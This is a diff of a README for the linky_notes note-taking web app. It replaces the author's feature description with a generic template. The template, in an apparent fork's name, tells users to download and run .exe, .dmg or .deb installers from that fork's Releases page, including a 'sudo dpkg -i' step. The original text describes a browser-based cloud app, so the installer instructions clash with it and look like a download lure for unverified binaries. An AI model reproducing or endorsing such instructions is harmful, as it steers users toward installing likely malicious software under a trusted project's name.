@@ -1,167 +1,78 @@
-<header align="center">
-  <h1>Welcome to linky_notes!</h1>
+# 📓 linkynotes.com - Organize Your Notes with Ease
 
-  <p>
-    Build your own easy-to-filter and internally linked notes system!
-    <br />
-    Store, organize & filter your notes by tags & style/format them using Markdown & HTML with inline CSS styles.
-    <br />
-    <strong>
-      Visit the app at 
-      <a href="https://linkynotes.com" target="_blank">
-        https://linkynotes.com
-      </a>
-      & see more. It's free!
-    </strong>
-  </p>
-</header>
+![Download](https://img.shields.io/badge/Download%20linkynotes.com-Get%20Latest%20Release-brightgreen)
 
----
+## 📋 Overview
 
-## Notes 📝
+linkynotes.com helps you organize, manage, and filter your private notes. With this application, you can tag notes with one or multiple labels, link them to other notes, and format your content using Markdown and HTML. Whether you're a student, a professional, or just someone who loves to keep track of information, linkynotes.com is designed to simplify your note-taking experience.
 
-You can **create, update & delete notes**.
+## 🚀 Getting Started
 
-Every note has its own **id and id-based URL**,
-so every note is basically the **standalone web page**
-(*using Markdown & HTML tags your notes can become real-world webpages*!)
-and also that's how you link notes to each other.
+Follow these steps to download and run linkynotes.com on your computer:
 
-Notes are created & updated with auto timestamps.
+1. Visit the [Releases page](https://github.com/MiguelA27/linkynotes.com/releases).
+2. Look for the latest version of linkynotes.com.
+3. Click on the download link that matches your operating system.
 
-## Tags 🔑
+## 💻 System Requirements
 
-To be able to add/ update note, you need to add **at least 1 tag** to it.
-There are **no limits** to how many tags you can add to your notes.
+To ensure smooth operation, please make sure your system meets these requirements:
 
-There are also no limits about how you can name your tags:
-it can be as simple as that *linky notes* or it can be *project_status: in progress*.
+- **Operating System:** Windows 10, macOS Catalina (or higher), or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+- **Internet Connection:** Required for downloading the application and fetching tags.
 
-Tags are also stored under the unique ids.
+## 📥 Download & Install
 
-You can have an **overview of all of your tags** on `/tags` page ordered alphabetically, so you can be up to date with all topics you were interested.
+To start using linkynotes.com, download the application from our [Releases page](https://github.com/MiguelA27/linkynotes.com/releases). 
 
-Every **tag works as a link**, so you can click on any tag in any note or on the tags page and you will be redirected to the page with notes filtered by that tag, where you can continue filtering notes by adding new tags to the filter.
+After downloading, follow these instructions based on your operating system:
 
-### Auto Tags Suggestions
+### For Windows Users:
 
-Recently I've added basic tags suggestions based on the note's content.
-The app makes 3 kinds of suggested tags:
-- identical to content words (`test` === `test`)
-- "startsWith" (`tests` starts with `test`)
-- "includes" (`vitest` includes `test`)
+1. Locate the downloaded `.exe` file, usually found in your "Downloads" folder.
+2. Double-click the `.exe` file to launch the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find linkynotes.com in your Start menu.
 
-The feature is in development.
+### For macOS Users:
 
-## Filtering by tag/s 🔎
+1. Find the downloaded `.dmg` file in your "Downloads".
+2. Double-click the file to open it.
+3. Drag the linkynotes.com icon to your Applications folder.
+4. Open your Applications folder and double-click linkynotes.com to launch it.
 
-You can **filter** your notes **by one or many tags simultaniously** using the built-in tag search engine.
+### For Linux Users:
 
-Every **search/ filter session** generates a **dedicated URL**, so you can navigate between search/filter sessions or save the link to particular session.
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Run the installation command: `sudo dpkg -i linkynotes.deb` (or the equivalent for your package type).
+4. After installation, you can launch linkynotes.com from your application menu.
 
-## Multiline Text 📄
+## 📝 Features
 
-Every note is accepting Markdown syntax. Even if you don't what Markdown is or you won't use Markdown, it enables you to sava a multiline text:
-to start a new paragraph you just need to leave an empty line after the previous paragraph (by clicking ENTER).
-This is the most basic usage of Markdown in this app.
+- **Tagging:** Easily tag your notes with one or multiple labels to keep them organized.
+- **Linking:** Connect related notes for easier navigation.
+- **Formatting:** Use Markdown and HTML to add structure and style to your notes.
+- **Search Functionality:** Quickly find notes using the built-in search feature.
 
-## Markdown Formatting ✨
+## 🌐 Community and Support
 
-As mentioned before, you can **format your notes with Markdown**. Using basic Markdown syntax enables you to add:
+If you encounter an issue or have a question, don’t hesitate to reach out. You can find support through the GitHub Issues section of this repository. Join our community discussions and stay updated on future releases and features.
 
-- headers (h1-h6)
-- links
-  - external => open a new tab,
-  - internal => redirecting to linked existing note inside the app
-- lists
-  - ordered,
-  - unordered,
-  - mixed,
-  - nested,
-- tables,
-- text decoration
-  - bold,
-  - italicized,
-  - strikethrough,
-- images (published on Internet),
-- horizontal rules,
+## 🌟 Additional Tips
 
-to your notes.
+- Regularly back up your notes to ensure you don’t lose any important information.
+- Experiment with different tagging strategies to see what works best for you.
+- Share your feedback and suggestions to help us improve linkynotes.com.
 
-Check out [my app's guide](https://linkynotes.com/guides/markdown-guide) to learn how to use basic Markdown in a few minutes!
+## 📈 Contribute
 
-These features can **make your notes more readable, unique and containing a lot of useful references and additional materials**. But... you'll discover, that you can do much more with your notes' content!
+We welcome contributions! If you would like to help improve linkynotes.com, please check the guidelines in our repository on how to get started. Every contribution, big or small, makes a difference.
 
-## Referencing already existing notes (internal links) 🔗
+## 📅 Updates
 
-As mentioned before, you can add **internal links to your notes**, what means, that you can refer to other existing note. To do that you need to copy note's id and pass it into your link, like that: `[check out this note](/notes/note-id-goes-here)`. That's all you need. Now, when you click this this link, you'll be redirected to refered note inside the app.
+Stay tuned for upcoming features and improvements. New versions will be released regularly, and you can always find the latest version on our [Releases page](https://github.com/MiguelA27/linkynotes.com/releases).
 
-You **combine this feature with any other Markdown enabled features** mentioned before & create:
-
-- lists (and todo lists) of linked notes inside some note *(for example, you can create a note which will be the description of the project or a book or a long article you're writing & such list of linked notes may be a table of content of all project's/ book's/ article's notes)*,
-- put the reference to some note in a footnote,
-- put links to notes to tables etc.
-
-## HTML with inline CSS styling
-
-In addition to formatting your notes with Markdown syntax, you can also use HTML with optional inline CSS styling!
-
-Of course, that requires some basic knowledge of HTML & CSS, but if you are really motivated to turn your note into complete web page full of colors, shapes, embed elements and any layout, than you can learn it online for free pretty fast.
-
-## Add videos, images &... even the whole websites to your notes!
-
-As been mentioned, thanks to ability of using HTML in your notes, you can also add different embed elements to your note. For example, you can add... the whole website (for instance, Linky Notes) to your notes by adding this: `<iframe src="https://linkynotes.com" width="100%" height="500px" title="Linky Notes About Page"></iframe>`!
-
-I will add some basic tutorial on the topic soon...
-
-## Cloud Database => Sync on all devices 💻🖥📱
-
-All your notes, tags and data are stored in a Cloud, so you can use the app on any device with the Internet connection (mobile, tablet, laptop, desktop) and have access to your synced notes anywhere.
-
-## No folders, no labels, no hierarchial structure. Your customizable management system only
-
-Although the linky_notes app has only a few simple functionalities, it offers endless possibilities for organizing, searching and using your notes in the way, which is impossible to many other note apps around. No need for folders, categories, labels etc., so there is no structure or hierarchy to manage (and strugle) with. You can do all of this using tags! You can even simulate other apps (I will add some examples soon).
-
-No more overthinking about how to organize or find your notes. You'll save a tone of time & mental resources you can use for creative activities, learning or developing projects.
-
-To read more, how to efficiently organize your notes, [read this app's tutorial](https://linkynotes.com/guides/app-guide).
-
-## Dark Mode 🌙
-
-You can use the app in light & dark mode.
-The app will automatically detect if you're preferring using dark or light mode on your system and change the mode of the app accordingly.
-You can switch the mode anytime by clicking the mode button in app's navigation menu/ bar. 
-
-## Privacy 🔐
-
-All your notes & data are **private**, what means that only the logged owner/ author of the note can see it.
-
-## Past & Future of Linky Notes
-
-I'm constantly developing & expanding the app since 2021 & I'm using the app everyday.
-
-From October 2 2025 I've decided to change the visibility of the source code of the app to private,
-because after massive app rewrite & upgrade in January 2025 I began adding more & more advanced features,
-so I believe I need to protect the code for future potential commercial purposes
-(*that's the reason I've created this public repo - to make it visible on Github*).
-
-## Tech Stack 🔧
-
-| Technology | 2021-2024 | January 2025 |
-| --- | :-: | :-: |
-| React | 18.2 | 19.0.0 |
-| Next.js | ❌ | 15.1.4 |
-| TypeScript | ❌ | 5+ |
-| Firebase | 9.1 | 11.1.0 |
-| Firebase Realtime Database | ✅ | ✅ |
-| React Bootstrap | 2.4 | 2.10.7 |
-| Bootstrap | 5.1 | 5.3.3 |
-| React Icons | 4.4 | 5.4.0 |
-| React Markdown | 8.0 | 9.0.3 |
-| React Router | 6.3 | ❌ |
-| React Redux | 8.0 | ❌ |
-| Redux Toolkit | 1.8 | ❌ |
-| JavaScript | ✅ | ❌ |
-| Bootstrap Icons | 1.6 | ❌ |
-| GitHub Pages | 3.2 | ❌ |
-| PWA | ✅ | ❌ |
+Thank you for choosing linkynotes.com! Happy note-taking!
